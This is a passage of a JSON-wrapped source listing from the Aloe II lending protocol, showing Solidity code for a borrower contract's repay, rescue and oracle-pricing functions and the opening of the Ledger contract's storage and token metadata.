@dev This is technically unnecessary since you could call `Lender.repay` directly, specifying this\n     * contract as the `beneficiary` and using the `transfer` sub-command to make payments. We include it\n     * because it's convenient and gas-efficient for common use-cases.\n     * @param amount0 The amount of `TOKEN0` to repay\n     * @param amount1 The amount of `TOKEN1` to repay\n     */\n    function repay(uint256 amount0, uint256 amount1) external onlyInModifyCallback {\n        _repay(amount0, amount1);\n    }\n\n    /**\n     * @notice Allows the `owner()` to withdraw their ante. Only works within the `modify` callback.\n     * @param recipient Receives the ante (as Ether)\n     */\n    function withdrawAnte(address payable recipient) external onlyInModifyCallback {\n        // WARNING: External call to user-specified address\n        recipient.transfer(address(this).balance);\n    }\n\n    /**\n     * @notice Allows the `owner()` to perform arbitrary transfers. Useful for rescuing misplaced funds. Only\n     * works within the `modify` callback.\n     * @param token The ERC20 token to transfer\n     * @param amount The amount to transfer\n     * @param recipient Receives the transferred tokens\n     */\n    function rescue(ERC20 token, uint256 amount, address recipient) external onlyInModifyCallback {\n        // WARNING: External call to user-specified address\n        token.safeTransfer(recipient, amount);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             BALANCE SHEET\n    //////////////////////////////////////////////////////////////*/\n\n    function getUniswapPositions() external view returns (int24[] memory) {\n        return extract(slot0);\n    }\n\n    /**\n     * @notice Summarizes all oracle data pertinent to account health\n     * @dev If `seemsLegit == false`, you can call `Factory.pause` to temporarily disable borrows\n     * @param oracleSeed The indices of `UNISWAP_POOL.observations` where we start our search for\n     * the 30-minute-old (lowest 16 bits) and 60-minute-old (next 16 bits) observations when getting\n     * TWAPs. If any of the highest 8 bits are set, we fallback to onchain binary search.\n     * @return prices The probe prices currently being used to evaluate account health\n     * @return seemsLegit Whether the Uniswap TWAP seems to have been manipulated or not\n     */\n    function getPrices(uint40 oracleSeed) public view returns (Prices memory prices, bool seemsLegit) {\n        (, uint8 nSigma, uint8 manipulationThresholdDivisor, ) = FACTORY.getParameters(UNISWAP_POOL);\n        (prices, seemsLegit) = _getPrices(oracleSeed, nSigma, manipulationThresholdDivisor);\n    }\n\n    function _getPrices(\n        uint40 oracleSeed,\n        uint8 nSigma,\n        uint8 manipulationThresholdDivisor\n    ) private view returns (Prices memory prices, bool seemsLegit) {\n        uint56 metric;\n        uint256 iv;\n        // compute current price and volatility\n        (metric, prices.c, iv) = ORACLE.consult(UNISWAP_POOL, oracleSeed);\n        // compute prices at which solvency will be checked\n        (prices.a, prices.b, seemsLegit) = BalanceSheet.computeProbePrices(\n            metric,\n            prices.c,\n            iv,\n            nSigma,\n            manipulationThresholdDivisor\n        );\n    }\n\n    function _getAssets(uint256 slot0_, Prices memory prices, bool withdraw) private returns (Assets memory assets) {\n        assets.fixed0 = TOKEN0.balanceOf(address(this));\n        assets.fixed1 = TOKEN1.balanceOf(address(this));\n\n        int24[] memory positions = extract(slot0_);\n        uint256 count = positions.length;\n        unchecked {\n            for (uint256 i; i < count; i += 2) {\n                // Load lower and upper ticks from the `positions` array\n                int24 l = positions[i];\n                int24 u = positions[i + 1];\n                // Fetch amount of `liquidity` in the position\n                (uint128 liquidity, , , , ) = UNISWAP_POOL.positions(keccak256(abi.encodePacked(address(this), l, u)));\n\n                if (liquidity == 0) continue;\n\n                // Compute lower and upper sqrt ratios\n                uint160 L = TickMath.getSqrtRatioAtTick(l);\n                uint160 U = TickMath.getSqrtRatioAtTick(u);\n\n                // Compute the value of `liquidity` (in terms of token1) at both probe prices\n                assets.fluid1A += LiquidityAmounts.getValueOfLiquidity(prices.a, L, U, liquidity);\n                assets.fluid1B += LiquidityAmounts.getValueOfLiquidity(prices.b, L, U, liquidity);\n\n                // Compute what amounts underlie `liquidity` at the current TWAP\n                (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(prices.c, L, U, liquidity);\n                assets.fluid0C += amount0;\n                assets.fluid1C += amount1;\n\n                if (!withdraw) continue;\n\n                // Withdraw all `liquidity` from the position\n                _uniswapWithdraw(l, u, liquidity, address(this));\n            }\n        }\n    }\n\n    function _getLiabilities() private view returns (uint256 amount0, uint256 amount1) {\n        amount0 = LENDER0.borrowBalanceStored(address(this));\n        amount1 = LENDER1.borrowBalanceStored(address(this));\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                 HELPERS\n    //////////////////////////////////////////////////////////////*/\n\n    function _uniswapWithdraw(\n        int24 lower,\n        int24 upper,\n        uint128 liquidity,\n        address recipient\n    ) private returns (uint256 burned0, uint256 burned1, uint256 collected0, uint256 collected1) {\n        (burned0, burned1) = UNISWAP_POOL.burn(lower, upper, liquidity);\n        (collected0, collected1) = UNISWAP_POOL.collect(recipient, lower, upper, type(uint128).max, type(uint128).max);\n    }\n\n    function _repay(uint256 amount0, uint256 amount1) private {\n        if (amount0 > 0) {\n            TOKEN0.safeTransfer(address(LENDER0), amount0);\n            LENDER0.repay(amount0, address(this));\n        }\n        if (amount1 > 0) {\n            TOKEN1.safeTransfer(address(LENDER1), amount1);\n            LENDER1.repay(amount1, address(this));\n        }\n    }\n}"
    },
    {
      "filename": "aloe-ii/core/src/Ledger.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.17;\n\nimport {ImmutableArgs} from \"clones-with-immutable-args/ImmutableArgs.sol\";\nimport {IERC165} from \"openzeppelin-contracts/contracts/interfaces/IERC165.sol\";\nimport {IERC2612} from \"openzeppelin-contracts/contracts/interfaces/IERC2612.sol\";\nimport {IERC4626} from \"openzeppelin-contracts/contracts/interfaces/IERC4626.sol\";\nimport {Math} from \"openzeppelin-contracts/contracts/utils/math/Math.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {BORROWS_SCALER, ONE} from \"./libraries/constants/Constants.sol\";\nimport {Q112} from \"./libraries/constants/Q.sol\";\nimport {Rewards} from \"./libraries/Rewards.sol\";\n\nimport {Factory} from \"./Factory.sol\";\nimport {IRateModel, SafeRateLib} from \"./RateModel.sol\";\n\ncontract Ledger {\n    using FixedPointMathLib for uint256;\n    using SafeRateLib for IRateModel;\n\n    struct Cache {\n        uint256 totalSupply;\n        uint256 lastBalance;\n        uint256 lastAccrualTime;\n        uint256 borrowBase;\n        uint256 borrowIndex;\n    }\n\n    Factory public immutable FACTORY;\n\n    address public immutable RESERVE;\n\n    /*//////////////////////////////////////////////////////////////\n                             LENDER STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Doesn't include reserve inflation. If you want that, use `stats()`\n    uint112 public totalSupply;\n\n    /// @dev Used in lieu of `asset.balanceOf` to prevent inflation attacks\n    uint112 public lastBalance;\n\n    /// @dev The last `block.timestamp` at which interest accrued\n    uint32 public lastAccrualTime;\n\n    /// @dev The principle of all outstanding loans as if they were taken out at `borrowIndex = ONE`\n    uint184 public borrowBase;\n\n    /// @dev Tracks all-time growth of borrow interest. Starts at `ONE` and increases monotonically over time\n    uint72 public borrowIndex;\n\n    /// @dev The principle of a given user's loan as if it was taken out at `borrowIndex = ONE`\n    mapping(address => uint256) public borrows;\n\n    /*//////////////////////////////////////////////////////////////\n                             ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    /// @dev Highest 32 bits are the referral code, next 112 are the principle, lowest 112 are the shares.\n    mapping(address => uint256) public balances;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /*//////////////////////////////////////////////////////////////\n                            ERC2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(address => uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                         GOVERNABLE PARAMETERS\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @dev `rateModel.getYieldPerSecond` is given 100000 gas, and the output is clamped to `MAX_RATE`. If\n     * the call reverts, it's treated the same as if it returned 0.\n     */\n    IRateModel public rateModel;\n\n    /// @dev The portion of interest that accrues to the `RESERVE`. Expressed as a reciprocal, e.g. 16 → 6.25%\n    uint8 public reserveFactor;\n\n    /*//////////////////////////////////////////////////////////////\n                              CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(address reserve) {\n        FACTORY = Factory(msg.sender);\n        RESERVE = reserve;\n    }\n\n    /// @notice Returns true if this contract implements the interface defined by `interfaceId`\n    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {\n        return\n            interfaceId == type(IERC165).interfaceId ||\n            interfaceId == type(IERC2612).interfaceId ||\n            interfaceId == type(IERC4626).interfaceId;\n    }\n\n    /// @notice The name of the banknote.\n    function name() external view returns (string memory) {\n        return string.concat(\"Aloe \", asset().name(), unicode\" ⚭ [\", Ledger(peer()).asset().symbol(), \"]\");\n    }\n\n    /// @notice The symbol of the banknote.\n    function symbol() external view returns (string memory) {\n        return string.concat(asset().symbol(), \"+\");\n    }\n\n    /// @notice The number of decimals the banknote uses. Matches the underlying token.\n    function decimals() external view returns (uint8) {\n        return asset().decimals();\n    }\n\n    /// @notice The address of the underlying token.\n    function asset() public pure returns (E"
    }
  ]
}